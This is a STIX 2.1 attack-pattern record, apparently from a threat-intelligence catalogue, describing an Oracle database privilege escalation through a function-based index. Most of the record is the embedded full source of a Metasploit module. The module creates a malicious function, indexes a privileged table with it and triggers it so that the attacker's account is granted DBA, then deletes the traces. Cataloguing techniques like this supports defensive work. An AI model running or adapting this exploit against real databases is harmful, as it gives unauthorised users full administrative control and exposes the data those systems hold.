{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1e4994e-6848-462e-b269-25729c3cc63a",
    "created": "2024-08-14T16:22:56.170453Z",
    "modified": "2024-08-14T16:22:56.170457Z",
    "name": "Oracle DB Privilege Escalation via Function-Based Index",
    "description": " This module will escalate an Oracle DB user to DBA by creating a function-based index on a table owned by a more-privileged user. Credits to David Litchfield for publishing the technique. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/oracle_index_privesc.rb",
            "external_id": "oracle_index_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.davidlitchfield.com/Privilege_Escalation_via_Oracle_Indexes.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB Privilege Escalation via Function-Based Index',\n      'Description'    => %q{\n        This module will escalate an Oracle DB user to DBA by creating a\n        function-based index on a table owned by a more-privileged user.\n        Credits to David Litchfield for publishing the technique.\n      },\n      'Author'         =>\n        [\n          'David Litchfield', # Vulnerability discovery and exploit\n          'Moshe Kaplan',     # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.davidlitchfield.com/Privilege_Escalation_via_Oracle_Indexes.pdf' ],\n        ],\n      'DisclosureDate' => '2015-01-21'))\n\n    register_options(\n      [\n        OptString.new('SQL', [ true, 'SQL to execute.', \"GRANT DBA to #{datastore['DBUSER']}\" ]),\n        OptString.new('TABLE', [ true, 'Table to create the index on.', 'SYS.DUAL' ]),\n      ])\n  end\n\n  def run\n    return unless check_dependencies\n\n    func_name = Rex::Text.rand_text_alpha(6..10)\n\n    create_function = <<-EOF\n      CREATE OR REPLACE FUNCTION #{func_name}\n      (FOO varchar) return varchar\n      deterministic authid current_user is\n      pragma autonomous_transaction;\n      begin\n      execute immediate '#{datastore['SQL'].gsub(\"'\", \"\\\\\\\\'\")}';\n      commit;\n      return '';\n      end;\n    EOF\n\n    index_name = Rex::Text.rand_text_alpha(6..10)\n    param_value = Rex::Text.rand_text_alpha(2..6)\n\n    create_index = \"CREATE INDEX #{index_name} ON \" \\\n      \"#{datastore['TABLE']}(#{datastore['DBUSER']}.#{func_name}('#{param_value}'))\"\n\n    trigger = \"SELECT * FROM #{datastore['TABLE']}\"\n\n    clean_index = \"drop index #{index_name}\"\n    clean_func = \"drop function #{func_name}\"\n\n    print_status('Running exploit...')\n\n    begin\n      print_status(\"Attempting to create function #{func_name}...\")\n      prepare_exec(create_function)\n      print_status(\"Attempting to create index #{index_name}...\")\n      prepare_exec(create_index)\n      print_status('Querying to trigger function...')\n      prepare_exec(trigger)\n      print_status('Cleaning up index...')\n      prepare_exec(clean_index)\n      print_status('Cleaning up function...')\n      prepare_exec(clean_func)\n      print_status('Exploit complete!')\n    rescue ::OCIError => e\n      print_error(\"Error! #{e.message}\")\n    end\n  end\n\n  def prepare_exec(query)\n    print_status(query)\n    super\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2015-01-21"
}